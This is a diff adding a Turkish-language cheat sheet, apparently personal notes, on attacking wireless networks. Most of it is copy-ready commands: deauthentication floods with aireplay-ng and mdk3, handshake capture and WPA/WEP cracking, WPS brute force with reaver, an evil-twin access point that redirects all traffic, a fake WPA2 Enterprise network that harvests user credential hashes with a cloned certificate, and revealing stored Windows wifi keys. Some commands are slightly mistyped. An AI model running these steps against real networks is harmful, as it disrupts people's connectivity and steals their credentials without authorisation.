@@ -1,0 +1,193 @@
+## 06. WİRELESS ATTACKS (KABLOSUZ SALDIRI):
+
+### Airmon-ng
+    Ağ kartını dinleme moduna almaya yarar.
+    
+    Bağlı adaptörleri görme:
+    `iwconfig  / airmon-ng`
+    
+    Ağ kartını dinleme moduna alma :
+    1.	`airmon-ng start wlan0` 
+    2.	`iwconfig wlan0 mode monitor`
+    3.	`iw dev wlan0 set type monitor`  // “iw dev wlan0 info” ile kontrol edebilirsin
+    Üç farklı işlem ile yapılabilir. Bitince wlan0mon moduna geçer.
+    Modlar arası geçiş yaparken ağ kartını devre dışı bırakmayı unutma. ( “iwconfig wlan0 up / down” )
+### Airodump-ng
+    Etrafındaki kablosuz ağları listeleme :
+    `airodump-ng wlan0mon`
+    NOT: Ağ kartını dinleme moduna alıp wireshark ile etraftaki ağlar hakkında bilgi toplayabilirsin.
+    
+    Kanala özel tarama yapma:
+    `airodump-ng wlan0mon -c kanal no`
+    
+    Erişim noktalarının üreticisi hakkında bilgi edinme:
+    `airodump-ng wlan0mon --manufacturer`
+    
+	Üretici listesini güncellemek için:  
+	`airodump-ng-oui-update`
+	
+    Hedef kablosuz ağ hakkında handskahe yakalama :
+    `airodump-ng -b bssid_adresi -C kanal_no -w /root/Desktop... wlan0mon`
+    -b (--bssid) = Hedef mac adresi
+    WPA handshake yazana kadar bekle. .cap dosyası oluşacak. 
+    
+    `--uptime` komutu ile ağın ne kadar süredir yayın yaptığını kontrol edebiliriz.
+	`airodump-ng  wlan0mon -w /root/Desktop... --uptime`
+
+### Aireplay-ng 
+    Wifi ağından cihaz düşürmede kullanılır. Cihazın ağdan düşüp tekrar bağlanması ya da yeni bir kullanıcının ağa bağlanması sırasında handshake dosyası yakalanır. Bu dosya içerisinde ağın parolası hakkında bilgi vardır.
+    
+    Tek Cihaz Saldırısı:
+    `aireplay-ng --deauth 5 -a hedef_modem_mac_adresi -c hedef_cihaz_mac_adresi wlan0mon`
+    5 sayısı gönderdiği paket sayısı, ne kadar artarsa ağdan kopma süresi artar.
+    `aireplay-ng --deauth 5 -a modem_mac_adresi -c hedef_mac_adresi wlan0mon & > /dev/null&`
+    Enter basınca pid no verir, arka planda çalışır. Aynı komutu girip hedef mac adresini değiştirip ikinci cihaza saldırı başlatılabilir. 
+    
+    `jobs` komutu ile arka planda çalışanlar görülür. 
+    `kill %sıra no` komutu ile işlem durdurulur.
+    `killall aireplay-ng` komutu ile tüm işlemler durdurulur.
+    
+    Çoklu Cihaz Saldırısı:
+    `aireplay-ng --deauth 1000 -a modem_mac_adresi`
+
+### Aircrack-ng
+    Yakalanan handshake dosyasına parola saldırısı yaparak wifi ağının parolasını elde etmeye yarar.
+    `aircrack-ng -w /root/wordlist_yolu -b bssid_adresi /root/kırılacak_dosya -0`
+    // -0 komutu komut satırını renklendirerek daha güzel görsel sağlar 
+    
+    Site üzerinden kırma işlemi : https://aircloud-ng.me
+
+### Airbase-ng
+    Sahte erişim noktası oluşturmaya yarar.
+    `airbase-ng -c 1 -e “SSID” wlan0mon`
+    -Z 1-5 arası şifreleme algoritmalarını belirtir. –Z 2 WPA2-PSK;TKIP mesela.
+### Chirp :
+	Telsizleri programlamaya yarayan bir araç.
+### Fern wifi cracker :
+	Kablosuz ağların şifrelerini kırmaya yarar.
+### Giskısmet :	
+	Kısmet programının dosyalarını farklı formata çevirmeye yarar.(veritabanı formatına)
+	`giskismet -x /root/.netxml dosyasını göster.`
+	Veri tabanı dosyası oluştu. db browser programıyla aç.
+### Kismet : 
+	Etrafta bulunan kablosuz ağlar hakkında bilgi toplamaya yarar.
+### Mdk3 :	
+	Etrafta bulunan kablosuz ağların internete çıkmasını engeller. Hedef mac adresini bilmek gerekir.
+	`mdk3 wlan0mon d -w /root/hedef_mac_adresinin_olduğu_txt_dosyası`
+    Ctrl+c ile işlem durdurulur.
+
+### Mfoc :
+	Akıllı kart sistemlerindeki parola korumalı yönetim dosyalarının parolasını kaba kuvvetle kırmaya yarar.
+### Mfterm :
+	Akıllı kartlarda yeni eklemeler yapar. Akıllı kartı programlar.
+### Wifite :
+	WPS destekli ağlarda pin no tespit ederek ağın şifresini ele geçirir. Handshake dosyası yakalayarak şifreyi kırar.
+### Fluxion
+    Sahte ağ kimliği yaratarak hedefin o ağa bağlanmasını ve şifresini elde etmemizi sağlar.
+### WifiSlax
+    Güzel bir araç. Araştırılacak..
+### Reaver
+    WPS korumalı modemlerin şifrelerini kırmaya yarar.
+    Monitör moduna geçilir. Etraftaki wps özelliğini kullanan modemleri listelemek için;
+    `wash -i wlan0mon`
+    
+    WPS kırmak için ;
+    `reaver --bssid modem_mac --channel 1 -i wlan0mod`
+    
+    Yetki hatası verirse;
+    `aireplay-ng --fakeauth 60 -a modem_mac -h kendi_mac wlan0mon`
+    
+### Etraftaki Erişim Noktaları Hakkında Bilgi Edinme (Windows)
+    Cmd komut satırına `netsh wlan show networks` yazarak etraftaki erişim noktalarını listeleriz.
+    `netsh wlan show profiles` -> Pc nin bağlandığı ağların listesi
+    Detaylı listeleme için `netsh wlan show networks mode = bssid`
+
+### Sahte Modem Yayını:
+    Easy Creds aracını araştır.  Başka yöntem;
+    3 şey gerekli. Yayın yapan bir cihaz. DHCP sunucusu ve DNS sunucusu.
+    hostapd ve dnsmasq yazılımlarını indir.
+    Önceden yönlendirme yapıldıysa hata vermesin diye tüm yönlendirme tablolarını silme;
+    `service network-manager stop`	      -> Önce network durdurulur.
+    `echo 1 > /proc/sys/net/ipv4/ip_forward`  -> Bu dosyadaki 0 değerini 1 yaptık.
+    `iptables --flush`
+    `iptables --table nat --flush`
+    `iptables --delete -chain`
+    `iptables table nat --delete -chain`
+    `iptables -P FORWARD ACCEPT`
+    
+    hostapd.conf dosyasını düzenleme: 
+    interface = wlan0
+    ssid      = ağ adı
+    channel   = 3
+    
+    dnsmasq.conf dosyasını düzenleme:
+    interface	=	wlan0
+    dhcp-range	=	10.0.0.10,  10.0.0.100, 8h
+    dhcp-option	=	3,  10.0.0.1 (modem ip)
+    dhcp-option	=	6,  10.0.0.1 (dns sunucusu)
+    addresss	=	/#///10.0.0.1 (her geleni yönlendir)
+    
+    `dnsmasq -C dnsmasq.conf dosya_yolu`
+    `hostapd -c hostapd.conf dosya_yolu -B`   (B: background çalışma)
+    
+    Sahte modeme hedef girdiğinde onu ilk bağlandığında yada farklı siteler açmaya çalıştığında bizim oluşturduğumuz index.html sayfasına yönlendirmek için;
+    /etc/apache2/sites-enabled/000-default.conf dosyasını düzenle.Sonra şu  komutu çalıştır;
+    `a2enmod rewrite`
+    
+### WEP Parola Kırma
+    1.	Dinleme modda hedef cihazın mac adresini öğren.
+    2.	Hedefe arpreplay ile paket gönderimi yap.
+    3.	Aircrack-ng ile dataların artmasına göre parolayı kırmayı dene.
+
+### WPA2 Enterprise
+    Kurumsal sahte ağ yayını oluşturma.
+    
+    Uygulamayı kur.
+    `apt-get install hostapd-wpe`
+    
+    interface ve ssid ayarlarını değiştir.
+    `leafpad /etc/hostapd-wpe/hostapd-wpe.conf`
+    
+    Sahte yayını başlat.
+    `hostapd-wpe -c /etc/hostapd-wpe/hostapd-wpe.conf`
+    
+    Hedef sahte ağa kullanıcı adı ve parola ile giriş yaptığında bilgiler ekrana gelir. Gelen bilgiler arasında kullanıcının hash değeri yakalanmış olur. Bu hash değerini jtr , hashcat gibi araçlarla kırabileceğimiz gibi asleap aracıyla da kırabiliriz;
+    `asleap -C challenge -R response -W wordlist yolu`
+
+    Sahte kurumsal ağa bağlanmak isteyen bir kullanıcıya sertifikaya güven uyarısı çıkabilir. Burada güvenli bir sertifika oluşturmak için farklı yollar mevcut.
+    
+    1.	Gerçek kurumsal ağa bağlanma isteği göndeririz. Parola doğru olsun olmasın ağın detaylarına baktığımızda kurumun sertifika bilgilerini görürüz. Sahte ağımıza bu sertifika bilgilerini girerek bağlanacak kişilerin güvenini daha da kazanmış oluruz.
+    
+    2.	Ağ kartını dinleme moduna alarak Wireshark aracıyla hedefimizi dinlemeye alırız. Yakalanan veri paketlerini incelediğimizde sertifika bilgilerinin yakalandığını görürüz. 
+    Filtre parametresi olarak    =>    “ssl.handshake.certificates”
+    
+    3.	Tshark aracıyla yakalanan pcap dosyası içerisinden sertifika bilgilerini elde etme
+        tshark -nr sslcert.pcap  -2 -R “ssl.handshake.certificate” -V
+        
+#### eaphammer
+    Sahte sertifika oluşturma aracı
+    `./eaphammer --cert-wizard`
+    Elde edilen sertifika bilgilerine göre istenilen değerleri girerek aynı sertifikadan üretmiş oluruz.
+
+### Sahte Yetkilendirme:
+    Hedef ağ ile ilgili handshake dosyası yakalamak için o ağda veri akışı olmalı yada ağa birilerinin girip çıkması gerekli. Deauth saldırıları ile ağdan kullanıcı düşürebilmiştik. Bunların olmadığını varsayalım. Sahte yetkilendirme ile hedef modem üzerinde kendimize yetki verip sonrasında içeriye paket göndererek veri alış verişini sağlarız.Böylece handshake bilgisi yakalamaya imkan yaratırız. 
+    
+    Modem üzerinde kendimize yetki verme:
+    `aireplay-ng --fakeauth 0 -a hedef_modem_mac -h kendi_mac_adresimiz wlan0mon`
+    
+    Paket Yükleme:
+    `aireplay-ng --arpreplay -b hedef_mac -h kendi_mac wlan0mon`
+    -h : Paketin kimden yükleneceğini belirtiyoruz. Hedef client makinenin mac adresini girerek ondan modeme paket gönderiyormuş gibi yapmak daha mantıklı.
+    
+### İsmi Gizli Olan Wifi Ağının Adını Bulma:
+    1-	Dinleme moda al
+    2-	ESSID bölümünde <length:0> yazanlar adını gizlemiştir. //buradaki 0 ağın adının karakter sayısını verir
+    3-	`airodump-ng --channel 4 --bssid mac_adresi wlan0mon`
+    4-	Ağdaki herhangi bir kullanıcı ağdan düşüp tekrar bağlandığında ya da yeni biri ağa bağlandığında ağ adı gelir.
+
+### Windows Wifi Parolasını Görme
+    Wifi bağlantılarını görme;
+    `netsh wlan show profiles`
+    
+    Bağlı bulunulan ağın parolasını görme;
+    `netsh wlan show profile “wifi ağ adı” key=clear`
